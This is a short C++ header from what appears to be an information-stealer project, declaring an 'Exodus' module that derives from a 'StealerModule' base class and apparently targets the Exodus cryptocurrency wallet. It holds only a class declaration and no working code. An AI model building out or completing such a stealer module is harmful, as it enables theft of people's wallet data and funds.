//
// Created by TERETERY on 07.06.2024.
//

#ifndef STEALER_EXODUS_H
#define STEALER_EXODUS_H

#include "../../../StealerModule.h"

class Exodus : public StealerModule {
public:
    void execute(fs::path &root) override;
};


#endif //STEALER_EXODUS_H
